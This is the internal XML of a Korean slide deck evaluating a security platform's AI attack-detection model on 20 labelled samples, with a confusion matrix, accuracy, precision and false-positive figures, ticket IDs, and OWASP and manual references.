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96ab2f9f247a2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="/docProps/app.xml" Id="R3a50d1d7daa149f7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="/ppt/presentation.xml" Id="Rc0ba785f949d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c2141311745fb"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="Ra644c5ec927348c1"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="256" r:id="R8acc6420fe9f4024"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="257" r:id="R187e5b5da637456a"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="258" r:id="Rae35ac7063374001"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="259" r:id="R59a1445076dc461f"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="260" r:id="R0205ed18037d4390"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="261" r:id="R9f7e7811f1b84098"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="262" r:id="Rd4f0bf95a2494ca6"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="263" r:id="R2c33b1169ef94b16"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="264" r:id="R706b26f0fec24164"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="265" r:id="Rafb5c0d4a08f486e"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="266" r:id="Rb7844ffffa894597"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="267" r:id="R66f43bf419dc474b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="268" r:id="Rf406f9b671214271"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="269" r:id="R7563acc7811147ae"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="270" r:id="R5d7d011c1ce741a8"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="271" r:id="Rc2ed35e58881469a"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="272" r:id="Rac8f1100ecaa4b39"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="273" r:id="R8b36468c380a4628"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="274" r:id="R19a5edfea6f34eb3"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="275" r:id="R0bbd6f05e9884163"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="276" r:id="R62de75e3bae64564"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="277" r:id="Rc72262e542dd43d7"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="278" r:id="Rf6f6efdcc62448cd"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="279" r:id="R9487469624f04b5c"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="280" r:id="Rcb9d4f3ac88e4e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e659654894c75" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="/ppt/slideMasters/slideMaster1.xml" Id="R982c2141311745fb" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Ra644c5ec927348c1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="/ppt/presProps.xml" Id="R389b327432c14ec2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="/ppt/tableStyles.xml" Id="R1dc6bea03a1f43e4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide1.xml" Id="R8acc6420fe9f4024" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide2.xml" Id="R187e5b5da637456a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide3.xml" Id="Rae35ac7063374001" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide4.xml" Id="R59a1445076dc461f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide5.xml" Id="R0205ed18037d4390" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide6.xml" Id="R9f7e7811f1b84098" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide7.xml" Id="Rd4f0bf95a2494ca6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide8.xml" Id="R2c33b1169ef94b16" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide9.xml" Id="R706b26f0fec24164" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide10.xml" Id="Rafb5c0d4a08f486e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide11.xml" Id="Rb7844ffffa894597" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide12.xml" Id="R66f43bf419dc474b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide13.xml" Id="Rf406f9b671214271" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide14.xml" Id="R7563acc7811147ae" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide15.xml" Id="R5d7d011c1ce741a8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide16.xml" Id="Rc2ed35e58881469a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide17.xml" Id="Rac8f1100ecaa4b39" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide18.xml" Id="R8b36468c380a4628" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide19.xml" Id="R19a5edfea6f34eb3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide20.xml" Id="R0bbd6f05e9884163" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide21.xml" Id="R62de75e3bae64564" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide22.xml" Id="Rc72262e542dd43d7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide23.xml" Id="Rf6f6efdcc62448cd" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide24.xml" Id="R9487469624f04b5c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide25.xml" Id="Rcb9d4f3ac88e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150c326ee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52d657b564828" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R2fe5f2f16ef345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9e87998064c45" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R8e8f7ec08e2e45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4644f8ed84ed3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R72894dcd554a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16922bea24da9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc66f14c7712049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2833a050d4f79" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf34ee13b0c564e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871671fdc642ca" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R5f2a9deb622247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67479a02b460f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R96869a15bdc9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1c79f20d64f5d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R6f9bdf93e08345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faa7e8a4c4a5c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R8915d54c9f2b47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cd3bee6ee54c98" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R1249deed733e42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6f5e44084a4a5a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rdf5b89b880ea47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f03d7ad3e545a8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R24039d4fdbec44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9bd5604c2f4404" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf308e3c7a5fc48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4450c5bc5f4802" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Redc5c163645245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e97bfeabda4ea8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R210c61308a134e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75ecce45784ebc" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rce81ab69a1e047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cbf74d68194ff9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc0b3bb4cedf24d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50e6e9b8a240f0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rff7277c9827242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2df1c8a6724c5a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R437ee320e5ce43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61bfcb949d452a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Re2c10068577f45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01cf87b88d4afe" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R2a5d5ba0bfe94c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b6e29fcbc545ef" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R82f3c257be7a47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1a711acf9c4596" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Ra3835871883842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96eae293b94567" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc1e4701ceec84a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77acbc68704ad3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R20c71a97fd0f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기존 테스트 과정과 결과를 정리한 자료. 작성일 2026-09-09. 현재 세션에서 서버 재전송·등록·플레이북 실행은 수행하지 않았다. 표기한 서버와 이름은 사용자 제공 정보다.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 근거: TP=10, FP=6, TN=4, FN=0. Accuracy=(TP+TN)/20=70%; TPR=TP/(TP+FN)=100%; Precision=TP/(TP+FP)=62.5%; FPR=FP/(FP+TN)=60%. 공격 라벨은 공격 의도·모사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판정은 보안 정책 적합성 또는 무해성을 인증하는 의미가 아니다. 공격 판정은 공격 의도·모사 패턴 기준이다. 192.0.2.0/24는 RFC 5737의 문서용 TEST-NET-1 주소.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설명을 재구성한 기존 테스트 흐름. 현재 세션에서 서버 연결, 로그 전송, 파서/이벤트 등록은 수행하지 않았다. LogGenerator README.md 264–275행은 프로토콜 선택, Host/Port 설정, 카탈로그·샘플 선택, IP/날짜, EPS, 전송 및 총 로그 수 확인 순서를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 정보: LogGenerator 파서, AITEST 일반 이벤트, AI TEST 티켓. 현재 설정값을 직접 조회하지 않았다. eyeCloudXOAR-playbook-guide_v4_ko.pdf p74, p77–80: 정오탐 분석과 payload, 결과 및 수동 피드백. 활성 알고리즘/모델 입력 매핑은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첨부 원본 PNG codex-clipboard-b275dc3b-4de1-4eb9-9aa0-9cb439990e1d.png. 화면 #3 이름은 말줄임 처리되어 있으므로 전체 명칭은 사용자 제공 티켓 상태 “정오탐 피드백 데이터 저장”을 따른다. 매뉴얼의 다른 명칭으로 교체하지 않았다. 현재 화면은 저장 완료 또는 재학습 완료의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티켓 목록 전문. 각 티켓의 제목 AI TEST, 담당자 미지정, 상태 분석/대응 ( 정오탐 피드백 데이터 저장 ). 날짜는 모두 2026-09-08. 두 목록을 정상군/공격군에 임의 매핑하지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000380 14:19:07</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000379 14:18:58</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000378 14:18:58</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000377 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000376 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000375 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000374 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000373 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000372 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000371 14:18:13</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000456 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000455 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000454 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000452 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000451 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000450 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000449 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000448 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000447 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000446 16:54:54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계산: {"counts":{"TP":10,"FP":6,"TN":4,"FN":0},"metrics":{"accuracy":0.7,"recall":1,"precision":0.625,"fpr":0.6,"specificity":0.4,"f1":0.7692307692307693}}</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Accuracy=(TP+TN)/(TP+TN+FP+FN). Recall=TP/(TP+FN). Precision=TP/(TP+FP). FPR=FP/(FP+TN). Specificity=TN/(TN+FP). F1=2TP/(2TP+FP+FN). 혼동행렬 정의는 eyeCloudXOAR-playbook-guide_v4_ko.pdf p74·77–80과 부합한다.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S01 수동=정상 모델=공격 화면값=0.47 FP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수동=정상 모델=정상 화면값=0.39 TN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수동=정상 모델=공격 화면값=0.48 FP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수동=정상 모델=정상 화면값=0.30 TN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수동=정상 모델=공격 화면값=0.31 FP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S06 수동=정상 모델=공격 화면값=0.60 FP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수동=정상 모델=정상 화면값=0.35 TN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수동=정상 모델=공격 화면값=0.43 FP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수동=정상 모델=정상 화면값=0.27 TN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수동=정상 모델=공격 화면값=0.65 FP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S11 수동=공격 모델=공격 화면값=0.43 TP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수동=공격 모델=공격 화면값=0.46 TP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수동=공격 모델=공격 화면값=0.37 TP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수동=공격 모델=공격 화면값=0.67 TP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수동=공격 모델=공격 화면값=0.51 TP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S16 수동=공격 모델=공격 화면값=0.60 TP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수동=공격 모델=공격 화면값=0.63 TP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수동=공격 모델=공격 화면값=0.45 TP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수동=공격 모델=공격 화면값=0.57 TP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수동=공격 모델=공격 화면값=1.00 TP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화면 값은 사용자 명칭 “정확도”를 보존한다. 산식이 제공되지 않았으므로 확률, 신뢰도, 유사도로 단정하지 않는다. 각 값의 단순 평균은 모델 정확도가 아니다. 점수와 판정은 사용자 제공 원값이며 차트 데이터는 편집 가능한 리터럴 값이다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S01 0.47 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S02 0.39 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S03 0.48 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S04 0.30 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S05 0.31 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S06 0.60 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S07 0.35 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S08 0.43 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S09 0.27 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S10 0.65 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S11 0.43 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S12 0.46 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S13 0.37 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S14 0.67 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S15 0.51 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S16 0.60 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S17 0.63 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S18 0.45 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S19 0.57 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S20 1.00 공격 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권고는 관측 결과(FP 6건)에 대한 후속 검증 제안이며 이미 수행했다는 의미가 아니다. eyeCloudXOARforAll-in-one_v4_ko.pdf p263–266은 Label 변경, 임시저장, Feedback, 강화학습의 별도 절차를 설명한다. 학습/평가 분리 여부와 활성 모델 메타데이터는 사용자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>화면 값=0.47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>화면 값=0.39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>화면 값=0.48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>화면 값=0.30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화면 값=0.31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>화면 값=0.60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>화면 값=0.35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>화면 값=0.43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>화면 값=0.27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화면 값=0.65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>화면 값=0.43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>화면 값=0.46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>화면 값=0.37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>화면 값=0.67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화면 값=0.51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>화면 값=0.60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>화면 값=0.63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>화면 값=0.45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>화면 값=0.57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화면 값=1.00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자료: 이 대화의 20개 샘플 및 20개 티켓, 첨부 원본 PNG.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>로컬 자료: C:/Users/user/Desktop/project/LogGenerator/README.md 264–275행. C:/Users/user/Desktop/AI 서버/eyeCloudXOARforAll-in-one_v4_ko.pdf p263–269. C:/Users/user/Desktop/AI 서버/eyeCloudXOAR-playbook-guide_v4_ko.pdf p74·77–80.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>웹 1차 출처(2026-09-09 확인):</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>sql: https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>path: https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>crlf: https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>xxe: 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ssti: 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ssrf: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>log4j: https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>command: 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probes: https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>auth: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>rfc: https://www.rfc-editor.org/info/rfc5737/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>이전 로컬 ai_model_detection_samples.json은 메서드·헤더·정상군이 현재 제공 데이터와 달라 평가에 대체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d4ed9e26f45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d8dbbdadc42fa" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="/ppt/slideLayouts/slideLayout1.xml" Id="Rba78b1900cf9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8b1900cf9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7afcbdf148dd" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide1.xml" Id="R5e8eac8d6b3f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48315ac994531" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide2.xml" Id="R7d77b7802573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a917b6ee441e7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide3.xml" Id="R8a3b5533a2af48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44b002888448f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide4.xml" Id="Reb32f84cf4b6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2c2a350c74b6f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide5.xml" Id="R29405dff9a46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38d20e0a4f07" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/ppt/media/image.png" Id="R0423ea0856304b74" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide6.xml" Id="Re413434f5893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68dab3e640ff" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide7.xml" Id="R75970c60632c4a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55623f164434a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide8.xml" Id="Rbfcfb029aa3a44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e875538dc4204" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide9.xml" Id="Rcb350dad491949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353b71e74095" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide10.xml" Id="R22e080d46468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459ae8e7a477b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide11.xml" Id="Ra2d6bed27ba94a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05c90213466b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide12.xml" Id="R3a1c13472bf0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e3c497834f6f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/chart" Target="/ppt/slides/charts/chart1.xml" Id="Rfba8ca367a4942e2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide13.xml" Id="Rb20238c078fc48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e95111efd4dfd" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide14.xml" Id="R9bffa4b571e848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fe5d021c4192" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide15.xml" Id="R859505a746714c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280e92fca4911" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide16.xml" Id="Rade8a83ea2b745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89b257fa34748" /><Relationship 